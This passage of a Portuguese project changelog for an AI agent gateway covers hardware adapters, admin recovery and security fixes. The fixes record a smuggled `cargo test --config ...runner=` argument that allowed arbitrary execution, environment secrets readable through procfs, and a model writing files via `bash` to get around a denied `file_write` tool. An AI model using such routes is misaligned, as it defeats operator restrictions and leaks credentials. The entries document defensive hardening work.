  consome o codigo uma unica vez, troca a senha (minimo 8 caracteres, igual ao
  resto do admin) e revoga as sessoes antigas (#1122).
- `POST /admin/api/recovery/start` responde sempre o mesmo corpo, existindo o
  usuario ou nao, e gasta o mesmo trabalho de PBKDF2 nos dois casos para nao
  virar um oraculo de enumeracao de usuarios. Com o painel ainda sem nenhum
  usuario a rota se recusa a gerar codigo: nada a recuperar, e ela nao pode
  virar caminho de criacao de conta (#1122).
- As duas rotas de recuperacao sao as primeiras do admin com limitacao por IP
  (10/min, o `RateLimiter` de auth do gateway). Cada inicio invalida o codigo
  anterior pendente do mesmo usuario, e se o arquivo nao pode ser escrito o
  codigo e descartado — nao fica vivo um codigo que ninguem consegue ler
  (#1122).
- A tela de login do admin mostra um "Esqueci minha senha" que explica o fluxo
  e os dois comandos do CLI. Nao ha formulario de envio nem mencao a e-mail: o
  canal do codigo e o host (#1122).
- **ADR 0020 propoe a crate `garraia-hardware` (epic #1124).** Documenta a
  decisao arquitetural que a regra absoluta 8 exige antes do primeiro commit
  de codigo do epic: `trait Device` + `Capability` com risk class R0-R5
  embutida desde o inicio (issues #1125+#1129), adapters (MQTT, Home
  Assistant, Serial/GPIO) aditivos ao core, reusando `ToolApproval`/
  `safety_gate` em vez de duplicar o gate de risco. Status `Proposed` de
  proposito: nenhum codigo nasce ate o dono aceitar.
- Plataforma de hardware completa (epic #1124, ADR 0020): as sete slices do
  epic estao entregues — crate `garraia-hardware` com `trait Device` e
  `Capability` carregando risco R0-R5 desde o primeiro commit (#1125/#1129),
  adapters MQTT (#1126), Home Assistant (#1127) e Serial/USB + GPIO (#1130),
  motor de automacoes `trigger -> condicao -> acao` sob a mesma policy do
  runtime (#1128) e integracoes empacotadas como hardware skills (#1131). A
  visao geral da plataforma — arquitetura em camadas, o north star passo a
  passo, o modelo de risco em uma tela e o que fica de fora (Modbus e ROS2
  ainda sem adapter; Zigbee e Matter por preset sobre o hub) — esta em
  `docs/hardware.md`.
- **Nova crate `garraia-hardware` + tools `device_list`/`device_read`/`device_execute` (epic #1124; #1125+#1129, ADR 0020 aceito 2026-09-12).** Fundacao do suporte a dispositivos fisicos: `trait Device` (async, `dyn`), `Capability` com risk class R0-R5 embutida desde o primeiro commit e invariante leitura-R0 (`leitura()`/`acao()`/`validar()`), `RiskClass::decisao()` tabela fail-closed (R0/R1 auto - R2 policy - R3 confirmacao humana - R4 aprovacao explicita - R5 deny salvo allowlist), `HardwareGate` consultando a tabela com allowlist do operador para R5, `DeviceRegistry` de `Arc<dyn Device>`, `DeviceStateStore` (presenca em SQLite, best-effort) e `MockDevice` de teste. Integracao no runtime: tres tools novas em `garraia-agents` com duas camadas de enforcement — os modos (`ToolGate`) negam `device_execute` nos read-only e o gate interno da tool trata R3/R4 pelo fluxo de confirmacao GAR-187 (`ToolApproval::Granted(fingerprint)` sobre o assunto `{device}/{capability}: {args}`) e fail-closed sem canal de confirmacao. Gateway e CLI registram as tools com registry vazio (fail-closed de nascimento); adapters reais (#1126 MQTT, #1127 Home Assistant, #1130 Serial/GPIO) entram depois, cada um seu PR.
- O gateway fala com dispositivos fisicos via MQTT (#1126, epic #1124). Com a
  secao `hardware.mqtt` no config (broker `host:porta`, `username` e
  `password_env` — o **nome** da env que guarda a senha, nunca a senha), o
  boot sobe o adapter rumqttc: descobre dispositivos pelo manifesto que cada
  um publica retained em `garra/devices/{id}/capabilities`, marca presenca
  pelos status/LWT em `garra/devices/{id}/status` e guarda o estado em
  `<data_dir>/hardware.db` (mesma resolucao de `memory.db`, via
  `AppConfig::hardware_db_path`).
- A leitura correlaciona `request_id`: publica em `garra/devices/{id}/get/{cap}`
  e espera a resposta em `state/{cap}` pelo id — sem resposta no timeout
  (5s), erro claro para o modelo. A execucao publica `set/{cap}` com os
  args validados contra o schema truncado do manifesto (tipos primitivos,
  `required`) e confirma **o que o broker aceitou** — nao o que o
  dispositivo aplicou; conferir o efeito e uma leitura depois.
- Fail-closed nos dois sentidos: manifesto que viola as invariantes
  (`validar()` de Capability, id que nao bate com o topico, segmentos
  perigosos) recusa o dispositivo inteiro, e classe de risco vem do
  manifesto declarado — nunca inferida de payload em tempo de execucao.
- `garra chat` sobe o mesmo transporte pela mesma funcao do gateway, entao
  o registry e o store de presenca (`hardware.db`) sao os mesmos nos dois.
- Sem `hardware.mqtt` no config, nada muda: registry vazio e
  `device_list` sem dispositivos, como antes.
- O gateway fala com o hub Home Assistant (#1127, epic #1124). Com a secao
  `hardware.home_assistant` no config (`url` do hub e `token_env` — o
  **nome** da env que guarda o long-lived access token, nunca o token), o
  boot sobe o adapter REST + WebSocket: descobre entidades por
  `GET /api/states`, le por `GET /api/states/{entity_id}`, executa por
  `POST /api/services/{domain}/{service}` e marca presenca pelos eventos
  `state_changed` do WebSocket, com reconexao automatica.
- Risco por dominio, pre-avaliado: sensor e binary_sensor so leem (R0);
  light, switch e climate executam em R1 (power, brightness, temperature);
  cover em R2 (open, close, set_position); lock em R3 (lock, unlock). Todo
  dominio fora dessa tabela nao vira dispositivo — fail-closed, sem R4/R5
  neste slice.
- Toda chamada ao hub passa pelo guard SSRF (`vet_url` + cliente pinado,
  regra 14) com escopo de IPs privados: o hub e alvo legitimo da LAN, mas
  link-local, CGNAT, multicast e addresses nao especificados continuam
  bloqueados; o WebSocket conecta no mesmo IP pinado, sem re-resolver DNS.
- `garra chat` sobe o mesmo adapter pela mesma funcao do gateway, e o store
  de presenca (`hardware.db`) passa a ser compartilhado entre os adapters
  configurados — uma fonte unica de online/offline.
- Feature `home-assistant` OFF por default (mesmo padrao do `mqtt` e do
  `storage-s3`): quem nao usa o hub nao paga a arvore de deps
  (reqwest + tokio-tungstenite). Sem a secao no config, nada muda.
- O gateway arma um motor de automacoes declarativas (#1128, epic #1124,
  ADR 0020) dentro do `garraia-hardware`. Com a secao `hardware.automations`
  no config (`dir` com as regras e `risk_ceiling` — default `r1`), o boot
  carrega os arquivos `*.toml`/`*.json` do dir, compila as regras e o motor
  assina o barramento de eventos que os adapters (#1126/#1127) publicam.
- Regra declarativa: gatilho `state_changed` (entidade) ou `cron`; condicoes
  em expressao (`to.state > 32`, avaliadas com fail-closed — erro de
  avaliacao nunca vira `false` silencioso); acoes `device_execute` em
  sequencia; knobs `debounce_secs` (rajada de eventos colapsa em uma
  execucao) e rate limit `max_per_hour` (janela deslizante de 1h).
- O gate de risco rege sem excecao: automacao roda sem canal de confirmacao
  (ninguem vai apertar "aprovar" as 3 da manha), entao o teto de risco do
  config corta o que ela pode pedir — `r0`, `r1` ou `r2`, nunca R3+: acao
  acima do teto fica bloqueada, com a negativa na auditoria. `garra config
  check` recusa `risk_ceiling` fora de `r0`/`r1`/`r2`.
- Toda execucao fica auditada no `automations.db` (mesmo data dir do resto
  do hardware): disparo, resultado (`executada`, `bloqueada_risco`,
  `condicao_falsa`, `condicao_erro`, `rate_limited`, `erro`), o detalhe de
  cada acao e a duracao. Regra desabilitada nao arma; spec quebrada nao sobe
  silenciosa — warn no boot e o motor fica fora ate o arquivo consertar.
- Feature `automations` OFF por default no crate; o gateway (e `garra chat`,
  pela mesma funcao de bootstrap) a liga, e o config decide se o motor arma.
  Sem a secao `hardware.automations`, nada muda — nenhum arquivo de regra e
  lido e o motor nao sobe.
- Terceira onda de transportes do `garraia-hardware` (#1130, epic #1124): uma
  placa Arduino ou ESP32 ligada pelo cabo USB vira dispositivo do agente. O
  adapter serial abre a porta, manda `{"garra_hello":true}` e adota a placa
  que responder com o manifesto; dai em diante o protocolo e JSONL, uma
  mensagem JSON por linha, com `request_id` correlacionando cada leitura e
  cada escrita. Porta que nao responde ao handshake e fechada e esquecida —
  um modem ou um GPS nunca viram "dispositivo".
- Firmware de referencia publicado em
  `crates/garraia-hardware/examples/firmware/`: um sketch sem bibliotecas
  externas (cabe num Uno) mais um README com o protocolo, o passo a passo de
  gravacao e as permissoes de porta no Linux.
- Adapter GPIO para Raspberry Pi: os pinos do proprio host expostos como
  `digital_read`, `digital_write` e `pwm`, com o operador declarando quais
  pinos sao entrada e quais sao saida. O que nao foi declarado e negado —
  escrever num pino fora da lista e erro, nao escrita silenciosa. Num host que
  nao e Raspberry Pi o adapter falha limpo, com o remedio no texto do erro
  (grupo `gpio` e `/dev/gpiomem`), sem registrar dispositivo fantasma.
- Risco vem do codigo, nao da placa: os dois adapters compartilham uma tabela
  fechada de capabilities — leitura (`digital_read`, `analog_read`) em R0 e
  escrita fisica (`digital_write`, `pwm`) em R2. O manifesto declara apenas os
  NOMES; nome fora da tabela recusa o dispositivo inteiro. Diferente do MQTT,
  onde o broker tem ACL e o risco pode vir do manifesto, qualquer pessoa com
  acesso fisico pluga um USB — entao a placa nao classifica o proprio risco.
- Hardening da superficie de descoberta: caminho de porta passa por allowlist
  de forma tty-like (`/dev/tty*`, `/dev/cu.*`, `/dev/serial/by-id/<nome>`,
  `/dev/serial/by-path/<nome>` ou `COM<n>`, sem `..`), entao `/dev/mem`,
  `/dev/sda` e `/dev/watchdog` sao recusados antes de qualquer `open`; a
  descoberta automatica so considera portas USB com VID/PID conhecido; o leitor
  corta linha acima de 64 KiB sem `\n` em vez de crescer o buffer; e pino,
  nivel e duty sao validados em faixa fechada antes de qualquer byte sair pela
  porta.
- Id de placa serial e do transporte, nao da placa: a chave do registry e
  `serial:<id declarado>`, o id declarado nao pode conter `:`, e uma segunda
  placa que chegue com um id ja ocupado tem a adocao **recusada** em vez de
  substituir o dispositivo que estava registrado. Sem isso, um firmware hostil
  se anunciaria com o id de um device legitimo (do Home Assistant, por exemplo)
  e passaria a receber as leituras e os comandos dele.
- Texto vindo da placa e tratado como entrada hostil no caminho inteiro: erro,
  id ecoado em recusa de handshake, nome de capability, `value` de leitura e
  `state` espontaneo passam por higienizacao antes de virar log, mensagem de
  erro ou resultado de tool — caracteres de controle, `U+2028`/`U+2029` e a
  superficie invisivel do Trojan Source (CVE-2021-42574) viram espaco:
  `U+061C`, `U+200B`-`U+200F`, `U+202A`-`U+202E`, `U+2060`-`U+2064`, os
  isolates `U+2066`-`U+2069` e o BOM `U+FEFF`. Cada string e cortada em 300
  caracteres e o JSON de uma leitura tem teto de 4 KiB (acima disso a leitura
  falha, em vez de entregar meio JSON).
- Pendente para um PR seguinte: **o wiring de config nao existe**. Os adapters
  vivem no crate (`SerialAdapterConfig`/`SerialAdapterManager`,
  `GpioAdapterConfig`), mas `garraia-config` ainda nao tem
  `[hardware.serial]`/`[hardware.gpio]` e nem o gateway nem a CLI sobem os
  adapters no boot. A issue #1130 tambem pede I2C/SPI, que nao entram aqui.
- Features `hardware-serial` e `hardware-gpio` OFF por default, mesmo padrao
  do `mqtt` e do `home-assistant`: quem nao liga hardware fisico nao paga a
  arvore de deps (`tokio-serial`/`serialport` e `rppal`). Sem as features, o
  crate compila e testa exatamente como antes.
- Hardware skills (#1131): adapters e presets de hardware passam a ser
  empacotados como skill, fechando a arquitetura em camadas do epic #1124 —
  core sem driver, integracao distribuivel. O frontmatter ganha `kind`
  (`instruction` por default, `hardware-adapter`, `hardware-preset`) e o bloco
  `provides` (transporte, capabilities, presets entidade->capability com
  sinonimos pt/en); a varredura de skills passa a descer em subdiretorios
  (`hardware/<slug>/SKILL.md`), ignorando symlinks e com teto de profundidade.
  Duas regras que o manifesto nao escolhe: a lista de transportes e fechada
  (`mqtt`, `home_assistant`, `serial`, `gpio` — qualquer outro carrega inerte,
  visivel e nunca ativo) e um skill so SOBE risco, nunca baixa (o risco
  efetivo e `max(adapter, skill)`, e leitura continua R0). Seis skills
  oficiais versionados em `skills/hardware/` — Home Assistant, MQTT,
  serial/Arduino, ESP32, Zigbee e Matter, os dois ultimos como preset sobre o
  hub em vez de stack propria. Documentado em `docs/hardware-skills.md`.
- **CI valida o YAML do frontmatter de `.claude/agents/*.md` (#1139).** O #1107 nasceu de uma `description` sem aspas que quebrava o `yaml.safe_load` em silencio; nada na trilha de CI percebia isso. Novo job `agent-frontmatter-lint` roda `scripts/ci/validate_agent_frontmatter.py` em todo push/PR: parseia so o frontmatter (nunca o corpo em prosa) e falha se o YAML for invalido ou faltar `name`/`description`/`model`.
- **Skill `/max-power` disponivel (ClaudeMaxPower adaptado ao GarraRUST).** Ativacao de um comando do harness GarraIA SuperPowers, portada do upstream `michelbr84/ClaudeMaxPower`: verifica os markers de instalacao (hook de sessao, skill assemble-team, tag ClaudeMaxPower no CLAUDE.md), repara o harness via git quando algo falta (nunca copiando do upstream, para nao destruir o fork), oferece o plugin oficial Superpowers (`superpowers@claude-plugins-official`), valida ferramentas de setup (cargo/gh/jq/python3/flutter), imprime o menu de capacidades e roteia por goal para a skill certa com dashboard de status.

### Changed
- Sem canal de confirmacao, o `run_tests` deixa de ser bloqueado
  incondicionalmente e passa a seguir a **mesma regra do `bash`**, aplicada a
  linha de comando que vai rodar de verdade. O bloqueio antigo nao protegia
  nada: no mesmo runtime `bash("cargo test")` roda, porque `cargo test` nao e
  comando sensivel no gate — era a mesma capacidade por outra porta, com o
  custo de deixar a ferramenta inutil no caminho full-auto. Agora `cargo test`
  e `npm test` rodam, e `pytest` continua bloqueado, porque roda por um
  interpretador Python que o gate trata como codigo arbitrario. Nenhuma
  capacidade nova e concedida. Com canal de confirmacao nada muda: toda suite
  continua pedindo aprovacao vinculada ao diretorio (#1084).
- O sha de rollback de skill passa a ser um tipo (`GitSha`) construido a partir
  do alfabeto aceito, em vez de uma string apenas inspecionada. Na pratica o
  valor entregue ao `git` e um que o modulo montou, e nao um que ele so olhou:
  ninguem consegue mais passar string nao checada onde se espera um sha, e o
  panico de fronteira de caractere fica impossivel por construcao em vez de
  apenas barrado. Isso tambem fecha o alerta CodeQL #166, que continuou aberto
  depois da primeira correcao — e corretamente, pelo modelo dele: a validacao
  devolvia `()` e a string original seguia para `Command::args`, entao nada no
  fluxo de dados tinha mudado (#1086).
- **#1089** o CI passa a compilar e rodar `garraia-agents` com
  `--features mcp`. A feature e OFF por default (`default = []`) e
  `tests/mcp_lifecycle.rs` comeca com `#![cfg(feature = "mcp")]`, entao os tres
  testes de ciclo de vida do MCP (reconexao, deteccao de filho morto e
  disconnect limitado) nunca executavam em nenhum job. O novo step
  `Run clippy + tests (mcp)` segue o mesmo padrao dos steps `signal`, `line` e
  `mcp-http`, que ja fechavam buracos identicos.
- **CLAUDE.md condensado para estado atual e invariantes (#1150).** A secao
  Estrutura de crates perdeu a narrativa historica de entrega (plans, PRs,
  datas, IDs GAR-xxx) — o historico de entrega permanece em plans/, docs/adr/
  e CHANGELOG.md, e o guia de agentes fica so com estado atual e invariantes.
  Alegacao de continue-on-error corrigida: zero flags ativas apos a #1094.
- Higiene de instalacao e rotina: bloco de tolerancia
  `KNOWN_PRE_PS1_TAG="v0.3.3"` e o argumento extra do probe
  `release-cdn/install.ps1` removidos do `install-endpoints.yml` (o
  proprio workflow pedia a remocao apos a primeira release >= v0.3.4);
  `.claude/commands/garra-routine.md` migrado do Linear (descontinuado
  2026-08-18) para o tracker interno, com nota do trigger desativado.
- **rmcp 2.2.0 → 3.3.0 (portado do repo privado, tracker GarraIA/GarraIA#163).**
  O SDK MCP salta um major com a API pós-2.2 preservada: no cliente, a
  ponte de tools usa `Peer::call_tool_once` — o enum MRTR-aware
  `CallToolResponse` (`Complete`/`InputRequired`/`Task`) — com os braços
  `InputRequired` (SEP-2322) e `Task` (SEP-2663) **fail-closed**: o bridge
  não dirige rodadas interativas nem polling de `tasks/get`, e o LLM vê o
  motivo. No servidor (`garra mcp-server`), o trait `ServerHandler` passa a
  devolver `CallToolResponse` (só `Complete`, via `From<CallToolResult>`) e
  `ListToolsResult` usa o construtor `with_all_items` com os campos novos
  SEP-2322/2549 (`result_type`/`ttl_ms`/`cache_scope`). O supervisor
  `get_info_advertises_only_tools_capability` acompanha: `tasks` saiu do
  `ServerCapabilities` e agora viaja como extensão em `extensions`.

### Removed
- Remove `crates/garraia-agents/src/tools/openclaw_bridge.rs` (codigo morto):
  o `OpenClawToolBridge` nunca foi registrado no `tools/mod.rs` nem
  referenciado em lugar algum desde 2026-04-06. A integracao OpenClaw viva
  segue em `garraia-channels` (feature `openclaw`) e `garra migrate openclaw`.
  Recuperavel do historico se tool-sharing entrar no roadmap.

### Fixed
- **Higiene no learning: o `reason` do rollback passa a ser gravado no ledger e o log do sha rejeitado ganha campos (#1094).** `GitSha::short` agora trunca por fronteira de char (`get(..)`), degradando para o valor inteiro em vez de panicar se o invariante do parse um dia mudar. `bad_sha` loga `sha_len` e a variante do erro, nunca o valor do sha. `validate_process_args` virou `reject_nul_argument`, nome honesto para o que faz: rejeitar so NUL. O rollback grava o motivo em `ScoreEntry.reason` (campo novo com `#[serde(default)]`, ledgers antigos seguem desserializando) e o doc de `rollback` deixa de afirmar que o motivo vai para a mensagem do `git revert`; os dois `git checkout` sem `--` ganharam comentario explicando por que ele fica de fora (medido no git 2.43.0, `--` quebra os dois formatos).
- **#1098 deixa de passar batido quando os servidores de voz estao fora.**
  Com `voice.enabled`, o gateway apenas logava um warning que ninguem lia e o
  `POST /api/tts` respondia 200 com fallback de texto — o dono nao via erro em
  lugar nenhum. O `GET /api/diagnostics` (e a pagina Diagnostics do console)
  agora tem as linhas `voice.tts` e `voice.stt`: cada uma sonda o endpoint
  configurado com budget de 1.5s e responde `ok`, `skipped` (modo voz
  desligado — nao e defeito) ou `error` com o comando exato de subida da
  `docs/voice.md` no `next_step`. A URL passa pelo `vet_url` do
  `garraia_common::ssrf` com `IpScope::AllowPrivate`, como o Ollama: voz e
  servico local, mas link-local e CGNAT continuam barrados. Falhar alto na
  propria requisicao continua disponivel em `/api/tts?fallback=false`.
  O contrato do fallback de texto do `POST /api/tts` agora e pinnado por teste
  de integracao com TTS que falha por injecao — 200 com `fallback:true` por
  padrao, 500 com `?fallback=false`. A sonda agora distingue tres erros:
  endpoint fora do ar (carrega o comando de subida no `next_step`), HTTP 5xx
  (servico de pe quebrado, aponta para os logs do servidor) e URL invalida
  (instrucao generica de config) — e nenhuma dessas respostas vaza credencial:
  o `detail` carrega so `scheme://host[:port]`, nunca `userinfo`.
- **O form de gateway key volta a aparecer quando a autenticacao e exigida (#1100).**
  O CSS deixa `.gateway-key-form` escondida com `display: none`, e o boot apenas
  limpava o estilo inline (`authSection.style.display = ''`), o que nunca sobrepoe a
  folha de estilo. Com `gateway.api_key` configurada o console avisava "Gateway API Key
  required." sem nenhum campo visivel para digitar a chave, e o WebSocket reconectava
  em loop com 401. Passa a usar `display: 'block'` explicito em `webchat.html` e
  `assets/app.js`, que duplicam a mesma logica.
- **O `mode` pedido na criacao da sessao volta a valer (#1102).** `POST
  /api/sessions` respondia 201 ecando o modo, mas a linha no banco nascia sem
  `agent_mode`: o handler grava o modo e **depois** emite o token de sessao, e
  `ChatSessionManager::create_token` chama `upsert_session(..., Value::Null)`
  so para garantir a linha antes da FK. Como `json_patch(T, P)` devolve `P`
  quando `P` nao e um objeto, aquele "no-op" reescrevia o metadado inteiro com
  `null` por cima do modo recem-gravado — e o modo escolhido e o que liga a
  `ToolPolicy` desde #988, entao a sessao rodava sem a politica pedida. O
  mesmo `upsert` explica por que `/api/mode/select` sempre funcionou: aquele
  caminho nao emite token. Agora um patch que nao e objeto e ignorado (e uma
  linha nova criada assim nasce com `{}`); `null` explicito **dentro** de um
  objeto continua apagando a chave, como o `clear_agent_mode` precisa.
- A description do agente test-engineer no frontmatter do `.claude/agents`
  passou a virar string entre aspas. O texto contem "regressao: roda", e o
  dois-pontos sem aspas quebrava o parse do YAML inteiro — o agente nao
  carregava em sessao nova nenhuma, e a equipe rodava com 6 dos 7 papeis,
  sem o Tester (#1107).
- **Seis paginas implementadas perdem a tag "Em breve" (#1116).** Providers,
  channels, sessions, settings, diagnostics e logs continuavam marcados como
  por vir na sidebar mesmo com o roteador ja despachando cada um para o seu
  loader real. As duas coisas que de fato nao existem - o sino de
  notificacoes e as abas CLI/Schema do painel direito - mantem a marca, mas
  o titulo agora cita a issue #1116 em vez do plan 0117a, que nao existe.
- **Falha de carregamento passa a dizer o codigo HTTP e o que fazer (#1116).**
  Um helper `renderFetchError` substitui os "Falha ao carregar X." espalhados
  pelos loaders. No caso 401 - o frequente, quando `gateway.api_key` esta
  ligada e o navegador nao tem chave salva - a mensagem aponta para o form
  "Gateway Authentication" do painel direito e o revela, em vez de mandar
  recarregar a pagina. Como o roteador esconde o painel direito nas paginas
  nao-chat, o reveal do 401 traz o painel de volta junto - exibir so o form
  nao valia nada com o ancestral escondido.
- **Hamburger do header volta a fazer algo no desktop (#1123).** O botao e
  renderizado em todas as larguras, mas o handler abria o drawer mobile sem
  checar o viewport: no desktop o unico efeito era o overlay que escurece a
  tela, porque a sidebar ja estava visivel pelo layout flex. Agora o clique
  ramifica por `matchMedia('(max-width: 768px)')` - no mobile continua abrindo
  o drawer, no desktop alterna `collapsed` na sidebar (CSS que ja existia e nao
  era usado por JS). `aria-expanded` acompanha o estado - a sincronizacao mora dentro de
  `openSidebarMobile`/`closeSidebarMobile`, entao fechamentos por caminhos
  pre-existentes (botoes de pagina, itens de sessao, settings) atualizam o
  atributo sem tocar no hamburger - e um listener de
  `resize` limpa `mobile-open` e o overlay ao cruzar o breakpoint, para a gaveta
  nao ficar presa numa janela que cresceu.
- **#1133 a documentacao do 2FA para de prometer uma cifragem que nao existe.**
  Quatro lugares (docs/security.md, o modulo TOTP do mobile, o TOTP do painel
  admin e a doc da store admin) diziam que o segredo do segundo fator era
  guardado cifrado; na verdade ele fica em claro base32 no banco —
  `admin_users.totp_secret` no admin.db e `mobile_users.totp_secret` no
  SQLite do gateway, paridade entre os dois fluxos. A doc agora descreve o
  estado real: a mitigacao e proteger o arquivo de banco (a mesma que o
  token de sessao ja usa), o login do painel admin exige o codigo TOTP
  quando ativado (o /auth/login mobile nao exige), e cifrar o lado admin
  com a chave mestra do painel e a issue #1141.
- **`codeql-triage.yml`: os inputs `state` e `tool` ganham o sentinela `all`, que so `severity` tinha (#1142).** As tres descricoes prometiam um "vazio = todos", mas o Actions substitui string vazia pelo `default:` declarado no input, entao o valor era inalcancavel via API — a mesma lacuna que o PR #890 fechou para `severity` e deixou aberta nas outras duas. O script ja suportava: `fetch_alerts` omite da query todo filtro vazio, entao `--state ""` e `--tool ""` sempre significaram "todos". Faltava o input conseguir entregar vazio. O custo apareceu na triagem do #1142, que precisou disparar o workflow duas vezes (`state=open`, depois `state=fixed`) para responder "o alerta existe em algum estado?", que e uma pergunta so. Nenhum valor existente muda de significado, e as permissoes do job seguem read-only (`security-events: read`, `contents: read`).
- **#1144: o hardening da sonda de voz que o #1098 ja prometia.** A revisao
  do PR #1115 (que entrou por auto-merge armado antes do veredito) achou
  tres lacunas no `GET /api/diagnostics`; as tres fecham aqui. (1) O motivo
  de um veto SSRF sai de um match proprio, campo a campo, e nao do `Display`
  de `SsrfRejection`: `voice.tts`/`voice.stt` sao auth-free sem a chave do
  gateway, e a garantia de que nenhuma variante ecoe a URL crua — com
  `userinfo` embutida — passa a ser estrutural, pinnada por teste. (2) O
  `next_step` de um HTTP 5xx agora e "inspecione os logs do processo", nao o
  comando de subida: o servidor esta de pe, e a `docs/voice.md` e o changelog
  do #1098 ja prometiam esse split. (3) A sonda e single-flight: o lock do
  cache e seguro atravessando a sonda inteira, entao N requests simultaneos
  numa janela de cache frio disparam um par de dials, nao N pares — o
  amplificador que o TTL existe para impedir deixava de valer pela porta dos
  fundos.
- **#1146 as instrucoes de instalacao de voz paravam de citar comandos que nao
  existem.** `docs/voice.md`, os hints do wizard (`garraia init`) e o `next_step`
  do `/api/diagnostics` mandavam rodar `chatterbox-tts serve` e `fwsh serve`:
  a wheel `chatterbox-tts` do PyPI e biblioteca e nao expoe CLI nenhuma, e `fwsh`
  nao existe em pacote algum. A doc tambem apontava para as imagens
  `ghcr.io/garraia/chatterbox` e `ghcr.io/garraia/hibiki`, que nunca foram
  publicadas. Os tres lugares agora descrevem o protocolo que os clientes em
  `garraia-voice` realmente falam: TTS pelo app Gradio `multilingual_app.py` do
  repo `resemble-ai/chatterbox` na porta 7860, e STT pelo `whisper-server` do
  `ggml-org/whisper.cpp` na porta 9090 (com a alternativa de qualquer servidor
  OpenAI-compatible expondo `/v1/audio/transcriptions`). Testes de regressao no
  wizard e no diagnostics impedem os comandos inventados de voltarem.
- **`StartLimitIntervalSec`/`StartLimitBurst` movidos para `[Unit]` no template systemd (#1147).** As duas chaves viviam em `[Service]`, onde o systemd as ignora em silencio (`Unknown key name ... ignoring`) — o circuit breaker de restart do gateway (5 quedas em 60s -> `failed`) nunca existiu de fato, e um crash-loop reiniciava para sempre a cada `RestartSec=5`. Adicionado `tests/systemd/verify_garraia_service.sh`, rodado em CI (`systemd-unit-verify`), que falha se `systemd-analyze verify` reportar qualquer chave ignorada/mal-posicionada no unit.
- Corrige `docker-compose.turboquant.yml`, que montava
  `docs/deployment/config.turboquant.yml` inexistente no repo — o
  `docker compose -f docker-compose.turboquant.yml up` falhava no boot.
  Config criado com provider `llamacpp` (keyless) apontando para o
  servico `llama-turboquant:8080` da rede do compose.
- Corrige `garra about`, que escrevia ANSI incondicional: `about > arquivo`,
  pipe, `NO_COLOR` e `TERM=dumb` recebiam sequencias de escape cruas. A tela
  agora e renderizada por `about_text(style)` a partir do mesmo dono de
  decisao do #942 (`ui::Capabilities::detect()`) — plain recebe ASCII puro,
  sem uma unica sequencia de escape, afirmado em teste.
- Fecha o RUSTSEC-2026-0253 (unsound pop() no lru 0.16.4): o bump do
  `aws-sdk-s3` 1.135.0 -> 1.146.1 moveu a cadeia aws-smithy para versoes
  que exigem lru >= 0.18.2; o Cargo.lock agora traz lru 0.18.4. Os ignores
  do advisory saem dos dois arquivos (`audit.toml` + `deny.toml`) em
  sincronia, como manda a invariante SYNC NOTE.

### Security
- O canal do procfs esta fechado: o processo `garra` passa a rodar
  `prctl(PR_SET_DUMPABLE, 0)` no inicio do `main`, e o kernel trata o
  `/proc/<pid>/environ` dele como root-only. Ate aqui um filho de tool de mesmo
  UID lia o ambiente do pai direto do procfs e alcancava `GARRAIA_JWT_SECRET`,
  `ANTHROPIC_API_KEY` e companhia — o scrub de ambiente do #1075 fechava a
  heranca, nao esse caminho. Medido com controle: sem o fix o filho le o
  segredo, com o fix recebe `EACCES`. Linux e Android; macOS e Windows nao tem
  esse canal. Nao e fail-closed de proposito — num kernel sem o knob o processo
  avisa e segue, porque nao subir o gateway seria trocar um vazamento estreito
  por indisponibilidade total (#1084, ADR 0019).
- O `test_name` do `run_tests` passa a ser validado antes de virar argumento do
  runner. Vinha do modelo e ia cru: `cargo test --config
  'target.<cfg>.runner=...'` aponta um executor de target, que e execucao
  arbitraria. A forma documentada `-p <crate>` segue aceita (#1084).
- **Rotas mutantes de /api/learning/ exigem origem propria e peer local quando nao ha api key (#1093).** Um POST para rollback roda `git revert` no repositorio do dono, mas respondia a qualquer um que alcancasse a porta: o gate de `gateway.api_key` e passa-direto na instalacao default e o CORS `Any` do dev mode deixava uma pagina qualquer do navegador disparar o mutante contra o loopback. Um guarda dedicado cobre POST/DELETE/PATCH/PUT das rotas de learning: Origin de outro esquema do transporte, de outro host, `Origin: null` ou `Sec-Fetch-Site: cross-site` viram 403; Origin ou Host fora da gramatica de authority (path, query, fragmento, userinfo, IPv6 sem colchete fechado, `:` dobrado, porta fora do intervalo) tambem viram 403 — o parse estrito rejeita qualquer sobra, do lado de quem manda e do lado de quem compara; peer nao-loopback sem chave configurada vira 503 fail-closed (mesmo precedente do /metrics); sem ConnectInfo, nao se finge que e loopback. No caso default sem chave, pedido de navegador so entra com `Host` de nome de loopback — ancora anti-DNS-rebinding: um dominio do atacante re-resolvido para 127.0.0.1 faz o navegador mandar Origin e Host iguais ao alias, e so o nome de loopback, que DNS publico nenhum aponta para fora da maquina, distingue o console do alias. Leitura (GET/HEAD/OPTIONS) segue como estava, e com a chave configurada a autenticacao continua sendo so do gate global.
- **O modo `ask` passa a negar `bash` (#1104).** A negacao de `file_write`
  era decorativa: `bash` e execucao arbitraria e o modelo escrevia o arquivo
  pelo shell (`printf ... > arquivo`), contornando a promessa "apenas
  perguntas" do modo padrao de Telegram/Discord/WhatsApp. Leitura (`file_read`,
  `list_dir`, `repo_search`, `web_search`) segue livre. `run_tests` nao e
  `bash`: executa toolchains fixas com nome de programa fixo, e continua
  permitido.
- **A allowlist do modo `orchestrator` passa a valer (#1110).** O modo
  declarava `allowed` com seis ferramentas (`bash`, `file_read`, `file_write`,
  `repo_search`, `web_search`, `web_fetch`), mas `whitelist_mode: false`
  fazia `ToolGate::permite` liberar qualquer ferramenta e a lista nunca era
  lida — no modo de maior orcamento do sistema (`max_tool_loops: 100`). A
  correcao e so fazer a lista valer: o proprio prompt do modo ja anuncia
  exatamente essas seis, entao nenhuma capacidade que o modo prometia foi
  retirada. Um teste trava o comportamento nas duas direcoes.
- **O lockout de TOTP do painel admin virou duravel (#1140).** A contagem de
  codigos errados (5 em 15 minutos) vivia num `HashMap` dentro do processo:
  reiniciar o gateway, atingir outra instancia ou usar processos
  independentes zerava o contador e devolvia o brute force de um codigo de 6
  digitos a quem ja tinha a senha. Agora ela mora na tabela `totp_attempts`
  do `admin.db`, com limpeza da janela expirada na mesma transacao em que
  conta — duas instancias sobre o mesmo banco compartilham um so orcamento
  de tentativas. Contagem ilegivel virou recusa fechada (500) em vez de "nao
  esgotou", e uma tentativa avaliada que nao consegue ser registrada tambem
  recusa: um chute de graca era o mesmo buraco por outro caminho. O custo
  aceito e o inverso do anterior: o dono espera a janela de 15 minutos, sem
  atalho por restart.
- **O segredo TOTP do painel admin passa a ser cifrado no `admin.db`
  (#1141).** Ele ficava em claro (base32) na coluna `admin_users.totp_secret`
